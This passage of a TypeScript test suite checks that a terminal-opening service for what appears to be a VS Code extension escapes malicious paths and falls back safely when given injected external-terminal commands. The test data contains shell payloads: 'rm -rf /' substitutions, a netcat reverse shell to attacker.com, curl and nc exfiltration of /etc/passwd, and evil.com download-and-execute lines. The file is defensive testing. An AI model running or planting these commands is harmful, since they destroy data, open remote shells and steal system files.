        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupSystemDefaultTerminal();
          const maliciousPath = 'C:\\Users\\User^evil^\\path';
          TestSetup.addFile('C:\\Users\\User^evil^', true);
          TestSetup.addFile('C:\\Users\\User^evil^\\path', true);

          try {
            await service.openDirectoryInTerminal(maliciousPath);
            const mocks = TestSetup.getMocks();
            const terminal = mocks.vscode.getLastCreatedTerminal();
            assert.ok(terminal, 'Terminal should be created with safely escaped path');
          } catch (error) {
            assert.fail(`Should handle malicious path without error: ${error}`);
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should safely handle path with redirect on Windows system default terminal', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupSystemDefaultTerminal();
          const maliciousPath = 'C:\\Users\\User>evil>C:\\passwords.txt';
          TestSetup.addFile('C:\\Users\\User>evil>C:\\passwords.txt', true);

          try {
            await service.openDirectoryInTerminal(maliciousPath);
            const mocks = TestSetup.getMocks();
            const terminal = mocks.vscode.getLastCreatedTerminal();
            assert.ok(terminal, 'Terminal should be created with safely escaped path');
          } catch (error) {
            assert.fail(`Should handle malicious path without error: ${error}`);
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should safely handle path with pipe on Windows system default terminal', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupSystemDefaultTerminal();
          const maliciousPath = 'C:\\Users\\User|findstr password\\path';
          TestSetup.addFile('C:\\Users\\User|findstr password\\path', true);

          try {
            await service.openDirectoryInTerminal(maliciousPath);
            const mocks = TestSetup.getMocks();
            const terminal = mocks.vscode.getLastCreatedTerminal();
            assert.ok(terminal, 'Terminal should be created with safely escaped path');
          } catch (error) {
            assert.fail(`Should handle malicious path without error: ${error}`);
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should safely handle path with percent variables on Windows system default terminal', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupSystemDefaultTerminal();
          const maliciousPath = 'C:\\Users\\%USERPROFILE%\\%APPDATA%\\path';
          TestSetup.addFile('C:\\Users\\', true);
          TestSetup.addFile('C:\\Users\\%USERPROFILE%', true);
          TestSetup.addFile('C:\\Users\\%USERPROFILE%\\%APPDATA%', true);
          TestSetup.addFile('C:\\Users\\%USERPROFILE%\\%APPDATA%\\path', true);

          try {
            await service.openDirectoryInTerminal(maliciousPath);
            const mocks = TestSetup.getMocks();
            const terminal = mocks.vscode.getLastCreatedTerminal();
            assert.ok(terminal, 'Terminal should be created with safely escaped path');
          } catch (error) {
            assert.fail(`Should handle malicious path without error: ${error}`);
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });
    });

    suite('openInTerminal with Malicious Paths', () => {
      test('should safely handle malicious file path with parent-directory behavior', async () => {
        const service = TestHelpers.setupWithOpenBehavior('parent-directory');
        const maliciousFile = '/home/user/$(rm -rf /)/project/src/file.ts';
        TestSetup.addFile('/home/user/$(rm -rf /)/project/src', true);

        try {
          await service.openInTerminal(maliciousFile);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped parent directory');
        } catch (error) {
          assert.fail(`Should handle malicious file path without error: ${error}`);
        }
      });

      test('should safely handle malicious file path with workspace-root behavior', async () => {
        const service = TestHelpers.setupWithOpenBehavior('workspace-root');
        const maliciousFile = '/home/user/project/`evil`/src/file.ts';
        TestSetup.addFile('/home/user/project', true);
        TestSetup.addFile('/home/user/project/`evil`/src', true);

        try {
          await service.openInTerminal(maliciousFile);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created at workspace root');
        } catch (error) {
          assert.fail(`Should handle malicious file path without error: ${error}`);
        }
      });

      test('should safely handle malicious file path with current-directory behavior', async () => {
        const service = TestHelpers.setupWithOpenBehavior('current-directory');
        const maliciousFile = '/home/user/project|evil|/src/file.ts';
        TestSetup.addFile('/home/user/project|evil|/src', true);

        try {
          await service.openInTerminal(maliciousFile);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped current directory');
        } catch (error) {
          assert.fail(`Should handle malicious file path without error: ${error}`);
        }
      });

      test('should safely handle deeply nested malicious path', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/$(whoami)/`hostname`/${HOME}/.ssh/config';
        TestSetup.addFile('/home/user', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped nested path');
        } catch (error) {
          assert.fail(`Should handle deeply nested malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with mixed Unix metacharacters', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal --working-directory={{directory}}');
        const maliciousPath = '/home/user/path; $(cat /etc/passwd) | `id` > /tmp/pwn #comment';
        TestSetup.addFile('/home/user', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle mixed metacharacters without error: ${error}`);
        }
      });

      test('should safely handle path with mixed Windows metacharacters', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupSystemDefaultTerminal();
          const maliciousPath = 'C:\\Users\\User & path|evil > C:\\keys %APPDATA% ^ test';
          TestSetup.addFile('C:\\Users\\User', true);

          try {
            await service.openDirectoryInTerminal(maliciousPath);
            const mocks = TestSetup.getMocks();
            const terminal = mocks.vscode.getLastCreatedTerminal();
            assert.ok(terminal, 'Terminal should be created with safely escaped path');
          } catch (error) {
            assert.fail(`Should handle mixed Windows metacharacters without error: ${error}`);
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });
    });

    suite('Edge Cases and Complex Scenarios', () => {
      test('should safely handle path with null byte attempt', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/path\0rm -rf /';
        TestSetup.addFile('/home/user', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          // Should handle safely - null bytes typically filtered earlier
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created or gracefully rejected');
        } catch (error) {
          // Also acceptable if it throws an error for invalid path
          assert.ok((error as any).message.includes('Invalid') || (error as any).message.includes('path'),
            `Expected path validation error, got: ${(error as any).message}`);
        }
      });

      test('should safely handle path with tab characters', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/path\tmalicious\tcommand';
        TestSetup.addFile('/home/user', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle path with tabs without error: ${error}`);
        }
      });

      test('should safely handle path with carriage return', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/path\rmalicious';
        TestSetup.addFile('/home/user', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle path with carriage return without error: ${error}`);
        }
      });

      test('should safely handle extremely long malicious path', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const base = '/home/user/';
        const injection = '../'.repeat(100); // Directory traversal attempt
        const maliciousPath = base + injection + 'etc/passwd';
        TestSetup.addFile('/home/user', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle long malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with unicode escape attempts', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/\\u0024\\u0028rm%20-rf%20/\\u0029/project';
        TestSetup.addFile('/home/user', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle unicode escape attempts without error: ${error}`);
        }
      });

      test('should safely handle path with multiple consecutive separators and injection', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user////../../etc/$(whoami)/path';
        TestSetup.addFile('/home/user', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle path with consecutive separators without error: ${error}`);
        }
      });
    });
  });

  suite('External Terminal Fallback Behavior', () => {
    suite('Fallback to Integrated Terminal on Malicious Command', () => {
      test('should fall back to integrated terminal when external command has semicolon', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal; rm -rf /');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        // Should not throw error, but fall back to integrated terminal
        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created');
        assert.ok(terminal.name.includes('Terminal'), 'Should be integrated terminal');
      });

      test('should fall back to integrated terminal when external command has pipe', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal | evil');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created');
      });

      test('should fall back to integrated terminal when external command has command substitution', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal $(rm -rf /)');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created');
      });

      test('should fall back to integrated terminal when external command has backticks', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal `evil`');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created');
      });

      test('should fall back to integrated terminal when external command has variable expansion', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal $HOME');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created');
      });

      test('should fall back to integrated terminal when external command has redirect', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal > /tmp/output.txt');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created');
      });

      test('should fall back to integrated terminal when external command is not in allowlist', async () => {
        const service = TestHelpers.setupExternalTerminal('malicious-command');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created');
      });

      test('should fall back to integrated terminal when external command has chained injection', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal; rm -rf / && curl http://evil.com | bash');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created');
      });

      test('should fall back to integrated terminal when external command has newline injection', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal\nmalicious');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created');
      });
    });

    suite('Fallback Security Logging', () => {
      test('should handle fallback gracefully when logging is suppressed', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal; evil');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        // Should not throw error even though logger is mocked
        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');
      });

      test('should handle fallback with command substitution gracefully', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal $(evil)');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');
      });

      test('should handle fallback with non-allowlisted command gracefully', async () => {
        const service = TestHelpers.setupExternalTerminal('unknown-terminal');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');
      });

      test('should handle multiple fallback scenarios in sequence', async () => {
        const maliciousCommands = [
          'gnome-terminal; malicious',
          'gnome-terminal $(evil)',
          'unknown-terminal'
        ];

        for (const command of maliciousCommands) {
          (TerminalService as any).instance = null;
          const service = TestHelpers.setupExternalTerminal(command);
          const paths = TestHelpers.getTestPaths();
          const parentDir = path.dirname(paths.unixFile);
          TestSetup.addFile(parentDir, true);

          const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

          await service.openDirectoryInTerminal(parentDir);

          const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
          assert.strictEqual(newTerminalCount, initialTerminalCount + 1, `Should handle fallback for: ${command}`);
        }
      });
    });

    suite('Complex Fallback Scenarios', () => {
      test('should handle fallback with reverse shell attempt', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal && nc -e /bin/sh attacker.com 4444');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created safely despite reverse shell attempt');
      });

      test('should handle fallback with data exfiltration attempt', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal | curl -X POST http://attacker.com -d @/etc/passwd');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created safely despite data exfiltration attempt');
      });

      test('should handle fallback with script download and execution', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal; wget http://evil.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created safely despite script download attempt');
      });

      test('should handle fallback with base64-encoded payload', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal $(echo "bWFs aWNpb3VzCg==" | base64 -d)');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created safely despite base64 payload');
      });
    });

    suite('Platform-Specific Fallback', () => {
      test('should fall back on Windows when PowerShell command has injection', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupExternalTerminal('powershell.exe -Command "Invoke-Expression (Get-Content malicious.ps1)"');
          const paths = TestHelpers.getTestPaths();
          const parentDir = path.dirname(paths.unixFile);
          TestSetup.addFile(parentDir, true);

          const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

          await service.openDirectoryInTerminal(parentDir);

          const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
          assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

          const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created safely');
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should fall back on Windows when cmd.exe has chain injection', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupExternalTerminal('cmd.exe /c "dir & malicious"');
          const paths = TestHelpers.getTestPaths();
          const parentDir = path.dirname(paths.unixFile);
          TestSetup.addFile(parentDir, true);

          const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

          await service.openDirectoryInTerminal(parentDir);

          const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
          assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

          const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created safely');
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should fall back on macOS when osascript injection attempt', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'darwin' });

          const service = TestHelpers.setupExternalTerminal('osascript -e \'do shell script "rm -rf /"\'');
          const paths = TestHelpers.getTestPaths();
          const parentDir = path.dirname(paths.unixFile);
          TestSetup.addFile(parentDir, true);

          const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

          await service.openDirectoryInTerminal(parentDir);

          const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
          assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

          const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created safely');
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });
    });

    suite('Fallback with openInTerminal API', () => {
      test('should fall back gracefully when using openInTerminal with malicious external command', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal; evil');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        // Use the high-level API
        await service.openInTerminal(paths.unixFile);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created safely');

        // Verify info message is shown to user
        TestHelpers.assertInfoMessage('Terminal opened');
      });

      test('should work with parent-directory behavior when falling back', async () => {
        const service = TestHelpers.setupWithOpenBehavior('parent-directory');
        TestSetup.updateConfig({
          terminal: {
            type: 'external',
            externalTerminalCommand: 'gnome-terminal && malicious',
            openBehavior: 'parent-directory'
          }
        });

        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openInTerminal(paths.unixFile);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created safely with parent-directory behavior');
      });

      test('should work with workspace-root behavior when falling back', async () => {
        const service = TestHelpers.setupWithOpenBehavior('workspace-root');
        TestSetup.updateConfig({
          terminal: {
            type: 'external',
            externalTerminalCommand: 'gnome-terminal | evil',
            openBehavior: 'workspace-root'
          }
        });

        const paths = TestHelpers.getTestPaths();
        TestSetup.addFile(paths.workspaceRoot, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openInTerminal(paths.unixFile);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created safely with workspace-root behavior');
      });
    });

    suite('Edge Cases in Fallback', () => {
      test('should handle fallback with extremely long malicious command', async () => {
        const longPayload = 'gnome-terminal; ' + 'A'.repeat(1000) + '; rm -rf /';
        const service = TestHelpers.setupExternalTerminal(longPayload);
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback even for long payload');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created safely');
      });

      test('should handle fallback with mixed case injection', async () => {
        const service = TestHelpers.setupExternalTerminal('Gnome-Terminal; Malicious');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created safely');
      });

      test('should handle fallback with multiple metacharacter combinations', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal; cat /etc/passwd | nc attacker.com 1234 & rm -rf /tmp');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

        await service.openDirectoryInTerminal(parentDir);

        const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
        assert.strictEqual(newTerminalCount, initialTerminalCount + 1, 'Integrated terminal should be created as fallback');

        const terminal = TestSetup.getMocks().vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created safely');
      });
    });
  });
});